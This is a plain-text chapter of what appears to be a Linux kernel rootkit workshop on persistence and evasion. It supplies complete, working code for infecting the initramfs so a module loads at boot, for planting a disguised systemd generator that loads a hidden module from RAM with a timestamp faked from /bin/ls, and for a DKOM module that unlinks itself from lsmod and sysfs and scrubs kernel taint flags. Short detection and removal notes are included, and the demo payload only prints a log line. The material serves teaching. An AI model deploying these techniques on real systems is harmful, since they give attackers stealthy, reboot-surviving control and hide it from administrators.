```txt

  ____  _____ ____  ____ ___ ____ _____ _____ _   _  ____ _____ 
 |  _ \| ____|  _ \/ ___|_ _/ ___|_   _| ____| \ | |/ ___| ____|
 | |_) |  _| | |_) \___ \| |\___ \ | | |  _| |  \| | |   |  _| 
 |  __/| |___|  _ < ___) | | ___) || | | |___| |\  | |___| |___ 
 |_|   |_____|_| \_\____/___|____/ |_| |_____|_| \_|\____|_____|

================================================================================
                       PART VI: PERSISTENCE & EVASION
================================================================================


----[ Introduction - The Immortal Rootkit ]-----------------------------------

You have built Userland hooks, Ftrace interceptors, and Kprobes snipers. You 
are essentially God on the system.

Until the administrator types: reboot

If your rootkit does not survive a restart, it is not a rootkit; it is a 
party trick. Persistence is the art of hacking auto-reload.

1. Initramfs Infection (Loading before the OS mounts)
2. Systemd Generator Poisoning (Fileless service injection)
3. DKOM (Direct Kernel Object Manipulation) to hide the evidence

----[ The Boot Chain Attack Surface ]-----------------------------------------

                  POWER ON
                      |
            [ BIOS / UEFI ]
                      |
            [ Bootloader (GRUB) ]
                      |
            [ KERNEL LOADS ]
                      |
          [ INITRAMFS (Initial RAM Disk) ] <--- ATTACK 1: Initramfs Infection
          | - Minimal FS in memory            (The Nuclear Option)
          | - Loads essential drivers
          | - *WE INJECT HERE*
          v
         [ MOUNT ROOT FILESYSTEM ]
                      |
            [ SYSTEMD INIT ] <--- ATTACK 2: Generator Poisoning
            | - Generators run    (Fileless Service Injection)
            | - Units load
            v
            [ MODULE LOAD ] 
            | - 'usb-storage'
            | - 'chaos.ko'
            v
         [ LOGIN PROMPT ]


----[ The "Loud" Payload ]----------------------------------------------------

To verify persistence, we need a payload that screams "I AM HERE" when it loads. 
We use `KERN_ALERT` to ensure the message hits the logs immediately.

1. Create these files in your `persistence/` directory.

----[ chaos.c ]---
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");
MODULE_DESCRIPTION("Persistence Test Payload");

static int __init chaos_init(void) {
    printk(KERN_ALERT "========================================\n");
    printk(KERN_ALERT "[+] PERSISTENCE SUCCESSFUL: Chaos Loaded\n");
    printk(KERN_ALERT "========================================\n");
    return 0;
}

static void __exit chaos_exit(void) {
    printk(KERN_INFO "[-] Chaos Unloaded\n");
}

module_init(chaos_init);
module_exit(chaos_exit);
------------------

----[ Makefile ]---
obj-m += chaos.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
-------------------

2. Compile the payload. We will use `chaos.ko` in the next steps.

----[ terminal ]---
make
# Ensure 'chaos.ko' is generated
-------------------


----[ Technique 1: Initramfs Infection ]--------------------------------------

The `initramfs` is a small archive loaded into RAM before the real root 
filesystem. By injecting here, our rootkit loads before most security tools.

We will create a hook script locally, then install it to the system.

----[ infect_initramfs.sh ]---
#!/bin/sh
PREREQ=""
prereqs() {
    echo "$PREREQ"
}
case $1 in
prereqs)
    prereqs
    exit 0
    ;;
esac

. /usr/share/initramfs-tools/hook-functions

# 1. Define where our rootkit is currently sitting (Change this path!)
# This should point to your compiled chaos.ko on the desktop
SOURCE_MODULE="/home/tengu/Desktop/cactuscon/rootkit/p2/chaos.ko"

# 2. Define where we want it inside the image
TARGET_DIR="/lib/modules/$(uname -r)/kernel/drivers/hid"

# 3. Create the directory inside the initramfs workspace
mkdir -p $DESTDIR/$TARGET_DIR

# 4. Copy the module in using the helper function
cp $SOURCE_MODULE $DESTDIR/$TARGET_DIR/chaos.ko

# 5. Force it to load at boot
force_load chaos



# ---[ Deployment

1. Install the hook from your local directory to the system directory.
   
----[ terminal ]---
# Make it executable locally
chmod +x initramfs_hook.sh

# Copy it to the system hooks directory (Note: Target filename usually lacks extension in /etc)
sudo cp initramfs_hook.sh /etc/initramfs-tools/hooks/persistence

2. Trigger the infection (Rebuilds boot image).
   
----[ terminal ]---
sudo update-initramfs -u
-------------------

3. Reboot and Verify.
   
----[ terminal ]---
# verfiy module is in new image
lsinitramfs /boot/initrd.img-$(uname -r) | grep chaos

sudo reboot

# ... Wait for reboot ...

4. Once logged back in:

# Check logs for our loud payload
sudo dmesg | grep "PERSISTENCE"
        # Output: [+] PERSISTENCE SUCCESSFUL: Chaos Loaded

5. Remove
sudo rm /etc/initramfs-tools/hooks/persistence
sudo update-initramfs -u

#should be empty, but we have not been aggressive enough
lsinitramfs /boot/initrd.img-$(uname -r) | grep chaos

find /lib/modules/$(uname -r) -name "chaos.ko"
/lib/modules/6.17.10+kali-amd64/kernel/drivers/hid/chaos.ko

sudo rm /lib/modules/6.17.10+kali-amd64/kernel/drivers/hid/chaos.ko
# lol still fails
# you have to nuke the infected image and build a clean one
sudo update-initramfs -d -k $(uname -r)
sudo update-initramfs -c -k $(uname -r)

###############################################
### How do defenders catch this technique? ###
#############################################

The "X-Ray" Scan (lsinitramfs): Standard Antivirus scans the disk, not 
the compressed boot image. Defenders must list the archive contents manually.

    lsinitramfs /boot/initrd.img-$(uname -r) | grep chaos

no timestomping = obvious

### WANT TO SEE HOW TO BREAK IT? ###
# Delete binary caches to force the kernel to read our text file and recover 
rm "lib/modules/$KERNEL_VER/modules.dep.bin" 2>/dev/null
rm "lib/modules/$KERNEL_VER/modules.alias.bin" 2>/dev/null
rm "lib/modules/$KERNEL_VER/modules.symbols.bin" 2>/dev/null
rm "lib/modules/$KERNEL_VER/modules.builtin.bin" 2>/dev/null

    - restart VM
    - immediately press and hold SHIFT (or mash ESC) to make GRUB stay open
    - Select Advanced options for Kali GNU/Linux
    - recovery mode for older kernel if possible
    - Once in, run:
        sudo update-initramfs -u -k all

    - if no old kernel:
    - press c to enter GRUB command line when at GRUB
    - list drives with ls, see a (hd0,msdos1) or similar
    - ls (hd0,msdos1)/boot/ (replace with actual drive ID) to look for files
        - look for initrd.img-6.x.x.old or initrd.img.old
        - if you see .old file, can manually force kernel to use that backup backpack
        
            # Set the root partition (adjust to match your ls output)
            set root=(hd0,msdos1)

            # Load the kernel manually
            linux /boot/vmlinuz-6.x.x-amd64 root=/dev/sda1 ro

            # Load the BACKUP initramfs
            initrd /boot/initrd.img-6.x.x-amd64.old

            # Boot
            boot

----[ Technique 2: Systemd Generator Poisoning ]------------------------------

Systemd Generators run very early and create unit files in RAM (`/run/`).
Files in `/run/` disappear on reboot, leaving no trace on the disk.

# the mechanism
Executables in this directory are run by Systemd *very* early in the boot 
process. Their job is to dynamically generate unit files into `/run/systemd/`.
Because `/run/` is a temporary filesystem (tmpfs) stored in RAM:
1.  The malicious service file is created in RAM at boot.
2.  Systemd executes it, loading the rootkit.
3.  The service file vanishes when the system powers down.


----[ poison_systemd.sh ]---
#!/bin/bash
# poison_systemd.sh
# Usage: ./poison_systemd.sh <path_to_module.ko>

MODULE_SRC=$1
HIDDEN_PATH="/usr/lib/.kernel_driver"
GENERATOR_PATH="/lib/systemd/system-generators/systemd-runtime-check"

if [ -z "$MODULE_SRC" ]; then
    echo "Usage: $0 <module.ko>"
    exit 1
fi

# 1. Hide the module on disk
mkdir -p "$HIDDEN_PATH"
cp "$MODULE_SRC" "$HIDDEN_PATH/driver.ko"
touch -r /bin/ls "$HIDDEN_PATH/driver.ko"

# 2. Create the Generator Script
# We create a shell script that systemd will execute at boot
cat <<EOF > "$GENERATOR_PATH"
#!/bin/sh
# This script runs at boot before networking
# It generates a service unit in /run/systemd/generator/

OUT_DIR="\$1"
SERVICE="kernel-integrity-check.service"

# Create the service file in memory (RAM)
cat <<UNIT > "\$OUT_DIR/\$SERVICE"
[Unit]
Description=Kernel Integrity Verification
DefaultDependencies=no
Before=sysinit.target
Conflicts=shutdown.target

[Service]
Type=oneshot
ExecStart=/usr/sbin/insmod $HIDDEN_PATH/driver.ko
RemainAfterExit=yes

[Install]
WantedBy=sysinit.target
UNIT

# Link it to be started automatically
mkdir -p "\$OUT_DIR/sysinit.target.wants"
ln -s "\$OUT_DIR/\$SERVICE" "\$OUT_DIR/sysinit.target.wants/\$SERVICE"
exit 0
EOF

# 3. Make executable (Required for systemd to run it)
chmod +x "$GENERATOR_PATH"

echo "[+] Generator planted at $GENERATOR_PATH"
echo "[+] Module hidden at $HIDDEN_PATH/driver.ko"
echo "[+] On next boot, service will generate into RAM and load module."

-----------------------------------
-------------------------------
---------------------------
### verify and demo ###

    sudo ./poison_systemd.sh chaos.ko
    sudo reboot

# 1. It is running
systemctl status kernel-integrity-check

# 2. It is NOT in the standard location
ls /etc/systemd/system/kernel-integrity-check.service
# Output: No such file or directory

# 3. It exists only in the RAM generator path
ls -l /run/systemd/generator/kernel-integrity-check.service


#### Detection & Forensics ####

    Audit Generators: Check /lib/systemd/system-generators/.

        Suspicious: Shell scripts (.sh). Most legitimate generators are compiled binaries.

        Suspicious: Recently modified files.

    Service Path Anomalies: If systemctl status shows a path starting with /run/ or /var/run/ 
    but there is no corresponding config in /etc or /lib, investigate immediately.

### removal ###
1. Remove the generator
    sudo rm /lib/systemd/system-generators/systemd-runtime-check

2. Remove the hidden module
    sudo rm -rf /usr/lib/.kernel_driver

3. Refresh systemd
    sudo systemctl daemon-reload

        Still see the ghost?
4. Don't forget to stop the service
sudo systemctl stop kernel-integrity-check

5. Reboot to wipe completely clean
sudo reboot

----[ Technique 3: DKOM - The "Vanish" Module ]-------------------------------

Now we hide the traces. This module unlinks itself from `lsmod` and cleans the 
kernel taint flags.

**The Taint:** Loading unsigned code sets "Taint Flags" in the kernel, alerting admins that the system integrity is compromised (visible in `/proc/sys/kernel/tainted`).
- The Solution:
Instead of hooking functions to "lie" about the presence of the module, we will modify the kernel's memory structures directly to remove the evidence.

### 1. The Source Code (`vanish.c`)
This code removes the module from the kernel's internal linked lists and scrubs the taint flags. 
*Note: We do not hardcode the taint address; we expect it to be passed in by the build script.*

----[ vanish.c ]---
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>    // For list_del_init
#include <linux/kobject.h> // For kobject_del

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");
MODULE_DESCRIPTION("DKOM Persistence & Evasion Demo");

// The build script will find the address and pass it here.
// If not defined, we default to 0 to prevent compile errors (safety check).
#ifndef TAINT_ADDR
#define TAINT_ADDR 0
#endif

// Pointer to the kernel's internal taint variable
static unsigned long *taint_ptr = (void*)TAINT_ADDR;

void hide_module(void) {
    // 1. Unlink from the Kernel Module List
    // This effectively removes us from 'lsmod' and '/proc/modules'
    // The module is still in memory, but the kernel's iterator skips it.
    list_del_init(&THIS_MODULE->list);

    // 2. Unlink from SysFS (/sys/module/)
    // This removes the directory /sys/module/vanish/
    // This prevents tools from finding us by scanning sysfs.
    kobject_del(&THIS_MODULE->mkobj.kobj);
    
    printk(KERN_INFO "rootkit: I have vanished from lsmod and sysfs.\n");
}

void scrub_taint(void) {
    if (!taint_ptr) {
        printk(KERN_ERR "rootkit: Taint address invalid.\n");
        return;
    }

    // The kernel sets specific bits when unsigned/out-of-tree modules load.
    // Bit 12: TAINT_OOT_MODULE (Out of tree)
    // Bit 13: TAINT_UNSIGNED_MODULE (Unsigned module)
    // We create a mask of these two bits.
    unsigned long mask = (1 << 12) | (1 << 13);
    
    // We use bitwise AND with NOT mask to clear ONLY those specific bits.
    // This leaves other taint flags (like hardware errors) intact.
    *taint_ptr &= ~mask;
    
    printk(KERN_INFO "rootkit: Taint bits scrubbed. Kernel claims to be clean.\n");
}

static int __init dkom_init(void) {
    printk(KERN_INFO "rootkit: Vanish module loaded. Engaging cloaking...\n");
    
    hide_module();
    scrub_taint();
    
    return 0;
}

static void __exit dkom_exit(void) {
    // NOTE: Once we unlink from the list, 'rmmod' cannot find us to unload us.
    // The only way to remove this rootkit is to reboot.
    printk(KERN_INFO "rootkit: Goodbye (if you can find me).\n");
}

module_init(dkom_init);
module_exit(dkom_exit);
-------------------

2. Create the Build Script.
   We cannot use a standard Makefile because we need to dynamically find the 
   taint address in `/proc/kallsyms` and pass it to the compiler.

----[ build_vanish.sh ]---
#!/bin/bash

# Check for root (needed to read /proc/kallsyms)
if [ "$EUID" -ne 0 ]; then 
  echo "[-] Please run as root (sudo)."
  exit 1
fi

echo "[*] Hunting for taint symbol..."

# Different kernels name the variable differently. We check both.
# 1. Try 'tainted_mask' (Common in newer kernels/Kali)
ADDR=$(grep -w "tainted_mask" /proc/kallsyms | awk '{print "0x"$1}')

# 2. If not found, try 'tainted' (Older kernels)
if [ -z "$ADDR" ]; then
    ADDR=$(grep -w "tainted" /proc/kallsyms | awk '{print "0x"$1}')
fi

if [ -z "$ADDR" ]; then
    echo "[-] CRITICAL: Could not find taint address in kallsyms."
    echo "    Check if 'kernel.kptr_restrict' is set to 2."
    exit 1
fi

echo "[+] Target Acquired: $ADDR"

# Clean previous builds
make -C /lib/modules/$(uname -r)/build M=$PWD clean > /dev/null

# Compile, injecting the address as a macro constant
echo "[*] Compiling module..."
make -C /lib/modules/$(uname -r)/build M=$PWD KCPPFLAGS="-DTAINT_ADDR=$ADDR" modules

echo "[+] Build complete."
echo "    Run: sudo insmod vanish.ko"
--------------------------

### makefile ###
obj-m += vanish.o

all:
	@echo "Do not run make directly. Use ./build_vanish.sh"

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

3. Build and Load.

----[ terminal ]---
#### verify and usage ####
cat /proc/sys/kernel/tainted
# Output Example: 12288

chmod +x build_vanish.sh
sudo ./build_vanish.sh
sudo insmod vanish.ko

lsmod | grep vanish
    : returns nothing

cat /proc/sys/kernel/tainted 
    : returns 0

sudo dmesg | tail
    : shows "rootkit: ....."

sudo rmmod vanish.ko...
        wait...
    `list_del_init(&THIS_MODULE->list)`
    We removed the entry from that list
    so the code is still in memory, running.
    Door to unload it (rmmod) has been bricked over
....only way to remove now is to **reboot.**


  ____  _   _ __  __ __  __    _    ____  __   __
 / ___|| | | |  \/  |  \/  |  / \  |  _ \ \ \ / /
 \___ \| | | | |\/| | |\/| | / _ \ | |_) | \ V / 
  ___) | |_| | |  | | |  | |/ ___ \|  _ <   | |  
 |____/ \___/|_|  |_|_|  |_/_/   \_\_| \_\  |_|  


----[ Workshop Summary & Final Checklist ]------------------------------------

Congratulations. You have traversed the landscape of Linux Kernel Rootkits:

1.  FOUNDATIONS
2.  USERLAND
3.  FTRACE
4.  KPROBES
5.  eBPF
6.  PERSISTENCE

Well Done!
Happy Hacking!

And remember, always RTFM.

[+] The Workshop is Complete
[!] System Halted

.EOF


```
